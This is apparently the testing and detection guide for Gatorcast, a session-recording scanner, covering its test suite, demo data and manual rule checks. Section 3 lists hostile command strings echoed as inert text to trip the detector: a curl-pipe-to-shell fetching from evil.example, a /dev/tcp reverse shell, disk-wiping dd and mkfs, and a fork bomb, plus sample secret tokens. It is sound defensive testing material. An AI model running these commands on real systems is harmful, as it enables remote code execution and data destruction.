# Gatorcast — Testing & Detection Walkthrough

This guide covers three things:

1. **[Running the automated test suite](#1-running-the-automated-test-suite)** — `pytest`.
2. **[Seeding demo data](#2-seeding-demo-data)** — populate a running instance with sample
   sessions that trip every rule, in one command.
3. **[Triggering detection patterns by hand](#3-triggering-detection-patterns-by-hand)** —
   the exact text to paste into a real recorded session (or POST yourself) to fire each
   built-in rule, plus the negative-control set that must produce **zero** findings.

For what the rules mean and how detection works under the hood, see
[SEARCH_AND_DETECTION.md](SEARCH_AND_DETECTION.md). For the data flow and session
lifecycle, see [ARCHITECTURE.md](ARCHITECTURE.md).

> **Nothing dangerous ever runs.** The detector scans the **on-screen plaintext** of a
> recording, not a process table. So `echo`-ing a dangerous-looking string (single-quoted,
> so the shell treats it as literal text) is enough to trip a rule — the command itself is
> never executed. Every secret value below is a fake/example value.

---

## 1. Running the automated test suite

The suite is plain `pytest` (Light tier — no `ruff`/`mypy` gating, no E2E required). Test
configuration lives in [`pyproject.toml`](pyproject.toml): `asyncio_mode = "auto"`,
`pythonpath = ["src"]`, and `testpaths = ["tests"]` are already set, so no extra flags are
needed. There is no `conftest.py`; each test module builds its own app, settings, and
`tmp_path` data directory.

```bash
# From the project root, in a virtualenv:
python -m venv .venv
. .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -c constraints.txt -e ".[dev]"   # installs pytest + pytest-asyncio + httpx, pinned as CI does

pytest                        # run everything
pytest -q                     # quieter (this is what CI runs)
pytest -q --collect-only      # list tests and print the collected count
pytest tests/test_detect.py   # one module
pytest -k "detect or extract" # by keyword
```

Without activating the virtualenv, call its interpreter directly, for example
`.venv/Scripts/python.exe -m pytest -q` on Windows or `.venv/bin/python -m pytest -q`
elsewhere.

### Test inventory

The suite currently collects **3017 tests** across 27 test modules, and all 3017 pass
(`pytest -q`, about 157 seconds, with one third-party Starlette deprecation warning about `httpx`). Counts are from `pytest --collect-only`;
parametrized cases count individually, so they drift as tests are added.

| Area | Module | Tests | Covers |
| --- | --- | --- | --- |
| Ingest front doors | `test_ingest_http.py` | 13 | `POST /ingest`: bearer auth (401), NDJSON, JSON array, single object, per-line tolerance, Docker `{"log":…}` unwrap on the `application/json` path, splitting on `\n` only (a Unicode line separator inside a header value does not tear the line), non-JSON lines dropped without failing the batch, lone surrogate escapes replaced and the lines stored. Asserts on the rows that land in SQLite (sessions, pending connections, API requests). |
| | `test_syslog_tcp.py` | 8 | Octet-counted and newline framing, back-to-back frames, EOF, end-to-end enqueue, and the defensive bounds (`MAX_FRAME_BYTES`, `MAX_LENGTH_DIGITS`). |
| | `test_normalize.py` | 10 | Plain JSON, syslog-wrapped, collector-wrapped, and junk lines. |
| Pipeline | `test_classify.py` | 625 | Legacy log-line classification: the two-stage recording filter, start/end events, API-request events, header and URL allowlisting, timestamp normalization. Web apps: `resource_type` normalization (and the `invalid` marker), the web URL form on every request, the widened method gate, and every `gwops` object outcome (accepted variants, each rejection reason with exactly one warning that names only the reason and `conn_id`, an ignored `app`, the object ignored on non-`WEB_APP` starts) over the web fixtures. |
| | `test_webmask.py` | 114 | `pipeline/webmask.py`: the masking function (quarter rule, revealed-character cleaning), the web URL form (path kept verbatim, no `proxy` truncation, no query allowlist, 4096 cap after masking), padded base64 tokens, and the provisional form. Pins that paths are **not** masked, so path masking cannot be added silently. |
| | `test_classify_envelope.py` | 16 | The envelope wire format (`session_start` / `recording_chunk` / `session_end` records with no `logger`), plus a legacy-regression check. |
| | `test_assembler.py` | 267 | Reassembly, finalize, idle backstop, startup sweep, and the connection lifecycle (pending → recording / api / error). The persisted seal mode: a late chunk after a restart or cache eviction leaves a terminally sealed `.cast` byte-identical, reopens a reopenably sealed one, and is ignored for an orphan or missing file; run with encryption off and on. Web apps: the storage policy per connection row (Kubernetes, no type, `WEB_APP`, any other type), requests before their start line stored fail-closed and converted when the start line arrives, redelivered batches, idle `WEB_APP` connections expiring to the hidden `empty` state with no session row, a request after `empty`, and the same sweep still surfacing SSH and Kubernetes errors. |
| | `test_extract.py` | 8 | Plaintext extraction and the character-to-time offset index, including an event that holds a raw Unicode line separator. |
| | `test_detect.py` | 103 | Built-in cast rules and the Kubernetes API rules; positive samples and look-alike negatives, and the guard that every built-in API rule is Kubernetes-only. |
| | `test_backfill.py` | 4 | Startup index + detect pass for finalized sessions that lack a sidecar. |
| | `test_retention.py` | 30 | Age and size purge, including API requests, API findings, and connections (connections purged on last activity). |
| | `test_activity.py` | 72 | Pure activity grouping: discovery, commands, activity sessions, and web visits. |
| Storage / crypto | `test_store.py` | 79 | `SessionRepository` and `CastStore`, including `list_systems` (`last_session_at`, `last_api_at`, `ssh_count` / `exec_count`, the kubectl and web request counts, the newest web TLS lookup, ordering by the newer timestamp) and the persisted seal mode. |
| | `test_db_schema.py` | 84 | Schema, indexes (the `api_kind`-led indexes replacing the retired ones, with a second `init_db` a no-op and `user_version` still 1), the `sealed_terminal` column, the `gc_is_discovery` SQL function, the connections / api_requests / api_findings tables, migrations, the `empty` connection state, and the documented types of the new `resource_type`, `gwops` and TLS columns (no constraints, no index over them, no manifest tables). |
| | `test_crypto.py` | 11 | AES-256-GCM `Cryptor`: round-trip, tamper, wrong key, wrong AAD, bad key. |
| | `test_search_store.py` | 30 | Findings persistence, the deprecated `SearchStore.search` wrapper, content scan, dashboard stats (windowing on the recording start, command-based API figures, kubectl-only API total, the web request total). |
| | `test_activity_store.py` | 226 | `ActivityStore`: connections, deduplicated API requests, API findings. Web apps: the two API kinds, web storage and redelivery, `resource_type` first write wins (a forged start cannot retype a connection in either direction), the web backfill (only that connection, repeatable, first processing only), expiry of idle web connections to `empty`, and the `gwops` snapshot reads. |
| | `test_timeline.py` | 339 | The unified search engine (`store/timeline.py`): command identity and grouping, window edges, keyset paging with no duplicate or skipped item for every source and sort, the merge against a brute-force sort, budget frontiers and *Continue*, filters and exclusions, risk-sort phases, flagged cap, failed-connection kind, user filter, `cmd` focus. Web apps: the `web` source (one row per connection, primary request, text filter, `scheme` and `upstream`, cursors across kinds, focus across both API sources, per-kind budgets) and a guard that no built-in API rule applies to web. |
| | `test_query_plans.py` | 49 | `EXPLAIN QUERY PLAN` pins for the hot queries, including the web queries (time range of its kind, the two user indexes, command probes, hydration, no discovery function, focus by primary key). Asserts index names, not plan text, so it survives SQLite version differences. |
| Web / config | `test_web.py` | 37 | Session/system routes, auth, `/cast`, fail-closed encryption, no external asset URLs, systems badges and timestamp columns, user and exec-to-command links. |
| | `test_web_search.py` | 208 | Unified `/search`: type select, interleaved kinds, failed rows, the exec row shown twice, legacy URLs, `cmd=` focus, HTMX partials and `400` partial, **Next ›** cursors, escaping; the CSV; the dashboard's links, figures and recent-activity feed. Web apps: the `web` type and its interleaving with kubectl, web rows (one per connection, app name and managed marker for exact snapshots, "unnamed" and the fixed gateway-id tooltip text, no app element for `none`/`ambiguous`/absent, escaping of the app name and gateway id, **Visit ›** and **Focus ›** links), `cmd` focus on a web request, and the 22-column CSV (header, columns 16 to 22 per kind, the formula guard on every text column). |
| | `test_search_params.py` | 309 | `web/params.py` and `web/kinds.py`: canonical and legacy parsing, every `400` (enum, length, repeat, conflict, window with `from`, `from > to`, `page_size`, regex), cursor round-trip and tamper cases, no `400` body echoing the value, `search_url` ordering, `resolve_kinds` exclusions, and a check that `store/` never imports `gatorcast.web`. Web apps: the `scheme` and `upstream` values and their mapping, exclusion of every non-web kind, `search_url` ordering, and `cmd` across kubectl and web. |
| | `test_web_activity.py` | 155 | kubectl activity routes, parameter validation (400s), dashboard kubectl card, activity-page links. Web apps: the systems summary split and badges (a web-only system never gets the Kubernetes badge), per-kind Requests links, the system page's configured-TLS block (every `gwops` state) and Web activity table, the `/systems/{slug}/web` visit view and its validation, hostile and `/`-containing addresses, and the dashboard's split kubectl and web tiles. |
| | `test_config_search.py` | 10 | Detection/search and kubectl-activity settings, including the `0 < gap <= max` validator. |
| | `test_bootstrap.py` | 2 | App boots through its lifespan, `/healthz` returns OK, schema initializes. |
| End-to-end | `test_e2e_search.py` | 2 | `/ingest` → classify → assembler → detect → search UI, asserting recorded content never appears in HTML or CSV; and the same path for web apps (start line with a `gwops` object, requests, search pages, visit view, CSV). |
| Secret hygiene | `test_secret_hygiene.py` | 206 | Posts `kubectl_audit_lines.ndjson` (planted sentinel secrets) through `/ingest`, with encryption off and on, then walks the seeded search URLs (every `type`, `user=` by username and by user id, `cmd=`, cursor walks, CSV exports) plus a crawl of the linked pages, and asserts no sentinel, `command=` value or full `User-Agent` reaches the database, logs, UI or any export. A second harness posts the web fixtures (credential-header sentinels, query-value sentinels, spoofed identity headers, `gwops` unknown-key and non-web `gwops` sentinels) and asserts none reaches the database, data volume, logs, any page (cursor pages and the visit view included) or any CSV. Path-token sentinels are asserted **present and unmasked** in the stored URLs and absent from logs and the volume, which pins the accepted risk. |

`test_detect.py` is the source of truth for rule behavior — it asserts both that each rule
fires on a positive sample and that look-alike-but-safe input does not.

### Fixtures

There is no shared `conftest.py` fixture layer. Shared test data lives in `tests/`:

| File | Contents |
| --- | --- |
| `tests/fixtures/sample_log_lines.ndjson` | Three real Gateway lines: a recording chunk, an `Authenticated connection` start line (a different `conn_id`), and a legacy API-audit line. |
| `tests/fixtures/kubectl_audit_lines.ndjson` | 13 synthetic lines: three start lines, API audits (one `failed`, one legacy line with no `request_id`), a status-101 exec audit, and k8s recording chunks including a `session finished` flush. Planted with `GC_SENTINEL_*` secrets for the hygiene test. |
| `tests/fixtures/timeline.py` | Builder for the unified-search tests. Inserts synthetic `sessions`, `findings`, `api_requests`, `api_findings` and `connections` rows through the stores with controlled timestamps: two clusters and two users, a kubectl run spanning two connections under one `Kubectl-Session`, a k9s-style connection with 250 requests, a discovery-only command, an exec command linked to its recording, commands straddling a window edge, a failed connection, and rows with only a user id. Nothing in it comes from a real capture. |
| `tests/fixtures/webapp_lines.ndjson` | 332 lines of `WEB_APP` traffic. The JSON traffic lines of a live gwops capture, sanitized (user ids, usernames, group ids, the tenant label and every credential header value replaced), plus synthetic lines for shapes the capture lacks: start lines carrying each `gwops` variant (every upstream and downstream mode, unmanaged with a free-text app name, `match: none` and `ambiguous`, a null gateway id, and invalid objects of each rejection kind), a start line with no object, non-web starts carrying a `gwops` object, requests with credential-header sentinels (values present and stripped), spoofed identity headers, path-token and query-value sentinels, unusual methods, a 101, a 502, a panic line, requests that arrive before their start line, and a redelivered batch. |
| `tests/fixtures/webapp_interim_lines.ndjson` | 67 lines of what gwops forwards today and its filter will stop forwarding: non-JSON lines, gateway service and token-rejection lines, and SSH audit and operational lines (approximate shapes). Used to prove they are dropped without storing or logging content. |
| `tests/samples.py` | `sample_lines()` helper that reads `sample_log_lines.ndjson`, plus the registries and helpers for the web fixtures (`webapp_lines`, `webapp_lines_for`, `webapp_batch`, `webapp_redelivery`, `webapp_interim_lines`, `webapp_mixed_batch`) and the `gwops` variant table. The app-to-mode mapping is inferred from the capture's rig app names and the interim SSH shapes are approximate; the module says so. |

### What CI runs

[`.github/workflows/publish.yml`](.github/workflows/publish.yml) is the only workflow. Its
`test` job runs on `ubuntu-latest` with Python 3.12.10:

```bash
pip install -c constraints.txt -e ".[dev]"
pytest -q
```

The `publish` job (build and push the image to GHCR) runs only if `test` passes. The workflow
triggers on pushes to `main`, `v*` tags, and manual dispatch. It does not trigger on pull
requests, and CI runs no linter or type checker. Run `pytest -q` locally before pushing.

---

## 2. Seeding demo data

[`scripts/seed_demo.py`](scripts/seed_demo.py) is the fastest way to populate the dashboard
and search UI. It POSTs 8 synthetic sessions (varied users, systems, and dates) and 7 `WEB_APP`
demo apps as a single NDJSON batch through the **real `/ingest` front door**. Each session is three log objects: an
`Authenticated connection` start line, one recording chunk, and a `Connection closed` event.
The start line creates a hidden pending connection, the chunk promotes it to a recording
(and creates the session), and the close event seals the session to complete immediately
instead of waiting on the idle backstop. The script sends no Kubernetes API-audit lines, so it
does not exercise kubectl activity. The web apps are described below.

Between them the sessions trip **every** built-in cast rule exactly once (21 findings in
total), and the final two sessions in the script are controls: `c-bastion-04`, an ordinary
clean session, and `c-safe-09`, a negative-control session of look-alike-but-safe commands.
Both must produce **zero** findings.

| Session | User | System | Findings |
| --- | --- | --- | --- |
| `c-prod-db-01` | alice@corp | prod-db-01 | 2 (critical) |
| `c-web-02` | bob@corp | web-02 | 2 (critical) |
| `c-k8s-03` | carol@corp | k8s-prod | 2 (high) |
| `c-jump-05` | dave@corp | jump-host | 2 (critical) |
| `c-ops-06` | erin@corp | ops-node | 9 (critical) |
| `c-secrets-07` | frank@corp | ci-runner | 4 (critical) |
| `c-bastion-04` | alice@corp | bastion | 0 (clean) |
| `c-safe-09` | grace@corp | staging | 0 (negative control) |

```bash
# 1. Start the service locally (or point BASE/TOKEN in the script at your instance).
#    The script defaults to http://127.0.0.1:8080 with the ingest token "test-ingest-token",
#    so set INGEST_TOKEN=test-ingest-token in .env before `docker compose up -d` for a
#    zero-config run.
docker compose up -d

# 2. Seed it.
python scripts/seed_demo.py
# -> POST /ingest -> 204 (115 objects: 8 sessions, 7 web apps / 91 lines)

# 3. Browse http://127.0.0.1:8080/dashboard?window=all — you should see 8 sessions,
#    6 of them flagged, severity/category breakdowns, and the two clean sessions with no
#    findings, plus a Web requests tile (70 requests).
```

`/ingest` returns `204 No Content`, which is what the script prints. The 24 recording objects
are 8 sessions times 3 lines; the count did not change when start lines started creating pending
connections, because every seeded connection also delivers a chunk and so becomes a session. The
91 web lines are 7 apps times 3 connections, each a start line plus 3 or 4 requests.

### Web-app demo data

Each demo app gets three connections (three different users) of 3, 3 and 4 requests: a `GET` with
a query string, a `POST`, a `DELETE`, a 404, a 502, a 403 and a 503. Between them the seven apps
cover every state the UI shows:

| App (`resource_address`) | `gwops` object | Shows as |
| --- | --- | --- |
| `portal.demo.test` | `exact`, managed, TLS 1.3 down, `verify_full` up | `HTTPS`, no upstream marker |
| `intranet.demo.test` | `exact`, managed, plaintext both legs | `HTTP`, `Plaintext upstream` |
| `metrics.demo.test` | `exact`, managed, TLS 1.3 down, `insecure` up | `HTTPS`, `Unverified upstream` |
| `billing.demo.test` | `exact`, managed, TLS 1.3 down, `verify_ca` up | `HTTPS`, `CA-only upstream` |
| `wiki.demo.test` | `exact`, **unmanaged** (app `Legacy Wiki (prod)`), `gateway_id` null | `HTTPS`, `Plaintext upstream`, "gateway id not yet assigned" on the system page |
| `plain.demo.test` | none: the start lines carry no `gwops` key | `TLS unknown`, "No gwops data" |
| `orphan.demo.test` | `match: none` | `TLS unknown`, "gwops matched no web app" |

The script does not seed a `match: ambiguous` object or a rejected one; the test suite covers both.
Every request line also carries a dummy `Authorization: Bearer DEMO-NOT-A-REAL-TOKEN` header,
which must never appear anywhere in the UI or a CSV export. A request to
`/login?token=abc123def456` is stored as `/login?token=ab…6(12)`. Web ids are derived from fixed
names, so running the script again posts the same `conn_id` and `request_id` values and ingest
deduplicates them. Web results are at `/search?type=web`, per app at `/systems/<address>`, and
filterable with `scheme` and `upstream` (for example `/search?type=web&upstream=plaintext`).

**Use `?window=all` on the dashboard.** The recording seed timestamps are fixed dates between
2026-06-12 and 2026-06-18, and the web seed starts at 2026-10-08 09:00 UTC. The dashboard defaults to the last 30 days, so once those dates
are older than that, the default view shows nothing. For the same reason, the daily
retention purge removes the seeded sessions once they are older than `RETENTION_DAYS`
(default 90). Edit the timestamps in the script, or set `RETENTION_DAYS=0`, to keep them.
`/systems` and `/search` are not windowed unless a `window` (or `from`/`to`) filter is set
(the dashboard's links carry `window`). The script sends no Kubernetes API-audit lines, so after
seeding `type=kubectl` in search is empty and the systems list shows no Kubernetes badges.

The script is not part of the app and is safe to delete. To point it at a different host or
token, edit the `BASE` and `TOKEN` constants at the top.

---

## 3. Triggering detection patterns by hand

Use this when you want to verify detection against a **real** Twingate Gateway recording, or
craft a one-off test case. There are two ways to get the text in front of the detector.

### Option A — paste into a live recorded session (recommended)

Open a session that the Gateway is recording (an SSH shell or `kubectl exec`), then paste the
block below. Because each line is a single-quoted `echo`, the shell just prints the string —
nothing executes — but the dangerous text still appears on screen and is captured in the
recording. The scan fires the rules live as the output is received (and again at seal).

```bash
echo 'rm -rf /tmp/foo'
echo 'curl http://evil.example/x.sh | sh'
echo 'chmod 777 /etc/passwd'
echo 'dd if=/dev/zero of=/dev/sda'
echo 'mkfs.ext4 /dev/sdb1'
echo ':(){ :|:& };:'
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
echo 'cat payload.b64 | base64 -d | bash'
echo 'kubectl delete pod web-0'
echo 'kubectl drain node-1'
echo 'kubectl get secret db-creds -o yaml'
echo 'iptables -F'
echo 'history -c'
echo 'sudo su -'
echo 'AKIAIOSFODNN7EXAMPLE'
echo '-----BEGIN RSA PRIVATE KEY-----'
echo 'ghp_0123456789abcdefghijABCDEFGHIJklmnop'
echo 'xoxb-1234567890-abcdefghijklmnop'
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
echo 'VAULT_TOKEN=hvs.CAESIABCDEFGHIJ1234567890abcdef'
echo 'password="hunter2supersecret"'
```

### What each line trips

| Line | Rule | Category | Severity |
| --- | --- | --- | --- |
| `rm -rf …` | `recursive-delete` | dangerous-command | high |
| `curl … \| sh` | `pipe-to-shell` | dangerous-command | critical |
| `chmod 777 …` | `chmod-777` | dangerous-command | medium |
| `dd … of=/dev/…` | `raw-disk-write` | dangerous-command | high |
| `mkfs.ext4 …` | `mkfs` | dangerous-command | high |
| `:(){ :\|:& };:` | `fork-bomb` | dangerous-command | critical |
| `… /dev/tcp/…` | `reverse-shell` | dangerous-command | critical |
| `base64 -d … \| bash` | `base64-pipe-shell` | dangerous-command | critical |
| `kubectl delete …` | `kubectl-delete` | dangerous-command | high |
| `kubectl drain …` | `kubectl-drain` | dangerous-command | high |
| `kubectl get secret …` | `kubectl-secret` | dangerous-command | high |
| `iptables -F` | `iptables-flush` | dangerous-command | medium |
| `history -c` | `history-clear` | dangerous-command | medium |
| `sudo su -` | `privilege-change` | dangerous-command | high |
| `AKIA…` (16 chars) | `aws-key` | secret-exposure | critical |
| `-----BEGIN RSA PRIVATE KEY-----` | `private-key` | secret-exposure | critical |
| `ghp_…` (36 chars) | `github-token` | secret-exposure | critical |
| `xoxb-…` | `slack-token` | secret-exposure | high |
| `eyJ….….…` | `jwt` | secret-exposure | medium |
| `VAULT_TOKEN=hvs.…` | `vault-token` | secret-exposure | critical |
| `password="…"` | `generic-secret-assign` | secret-exposure | medium |

Notes:

- **Secret patterns are case-sensitive** (`AKIA`, `ghp_`, `eyJ`, `hvs.`). The casing above is
  exact — don't lowercase them, or those rules won't fire.
- The `ghp_` token needs **exactly 36 trailing characters** and the AWS key needs **16
  characters after `AKIA`** — both are correct as written.
- The 21 lines above trip **all 21 built-in cast rules** — one finding per rule (verified
  against `gatorcast.pipeline.detect`). Two lines trip more than the table shows:
  `chmod 777 /etc/passwd` also trips `privilege-change` (its `passwd` alternative matches the
  filename), and `sudo su -` trips the same rule, so that rule still yields a single
  finding. Change the path in the `chmod` line if you want it to trip `chmod-777` alone.
  `VAULT_TOKEN=` does **not** also trip `generic-secret-assign`: the underscore in
  `VAULT_TOKEN` defeats that rule's `\btoken=` word boundary, which is why the separate
  `password="…"` line is what exercises it.
- These are the cast (on-screen text) rules. The Kubernetes API rules (`kube-delete`,
  `kube-secrets`, `kube-evict`, `kube-cordon`, `kube-exec`, `kube-node-proxy-exec`) match the
  method and path of Gateway API-audit lines, not recording text, so pasted `echo` lines
  cannot trip them. `tests/test_detect.py` covers them.
- Each rule fires **at most once** per recording (earliest match wins), so duplicating a line
  adds no new findings — this block is already a full sweep.

### Option B — POST a recording yourself with `curl`

If you don't have a live Gateway, you can craft the three log objects (session start,
recording chunk, close) and POST them as NDJSON. This mirrors exactly what
[`scripts/seed_demo.py`](scripts/seed_demo.py) does. The asciicast value is a header line
followed by `[offset, "o", "<text>"]` event tuples.

```bash
INGEST_TOKEN=test-ingest-token   # match your container's INGEST_TOKEN

curl -sS -X POST http://127.0.0.1:8080/ingest \
  -H "Authorization: Bearer ${INGEST_TOKEN}" \
  -H "Content-Type: application/x-ndjson" \
  --data-binary @- <<'NDJSON'
{"logger":"gateway","message":"Authenticated connection","conn_id":"c-manual-01","resource_address":"test-host","user":{"username":"tester@corp","id":"tester","groups":["eng"]},"ts":"2026-06-22T12:00:00Z"}
{"logger":"gateway.audit","conn_id":"c-manual-01","asciicast_sequence_num":0,"user":{"username":"tester@corp","id":"tester","groups":["eng"]},"ts":"2026-06-22T12:00:00Z","asciicast":"{\"version\":2,\"width\":100,\"height\":30,\"timestamp\":1718700000}\n[0.5,\"o\",\"tester@test-host:~$ rm -rf /tmp/foo\\r\\n\"]\n[2.0,\"o\",\"tester@test-host:~$ export KEY=AKIAIOSFODNN7EXAMPLE\\r\\n\"]\n"}
{"logger":"gateway","message":"Connection closed","conn_id":"c-manual-01","ts":"2026-06-22T12:00:05Z"}
NDJSON
```

The session seals to complete on the close event (or a `"session finished"` chunk; otherwise
the idle backstop after `SESSION_MAX_IDLE_SECONDS`). It is scanned live as it arrives and
appears at `/sessions/c-manual-01` with `recursive-delete` and `aws-key` findings. Note the
double-escaping: `asciicast` is a JSON **string** whose value is itself a JSON document, so
its inner quotes and line separators are backslash-escaped once (`\"`, `\n`), and the
`\r\n` inside each event's text is escaped twice (`\\r\\n`). A single `\r\n` there puts a raw
CR/LF inside the inner JSON string, which splits the event line; the recording then
reassembles with zero events and no findings.

---

## Negative controls (false-positive check)

Detection is only as useful as its precision, so the test data deliberately includes commands
that *look* dangerous but must match **no** rule. Paste these into a recorded session and
confirm the session finalizes with **zero** findings:

```bash
echo 'rm old.log'                                   # rm without -rf
echo 'chmod 755 deploy.sh'                          # not 777
echo 'kubectl get pods -n staging'                  # get, not delete/drain/secret
echo 'curl https://api.example.com/health -o h.json' # curl to a file, no pipe to shell
echo 'dd if=disk.img of=/tmp/disk.copy'             # dd to a file, not /dev/
echo 'grep password notes.txt'                      # "password" with no assignment
echo 'history | tail -20'                           # history without -c
```

If any of these produce a finding, that's a false positive worth a regression test in
[`tests/test_detect.py`](tests/test_detect.py).
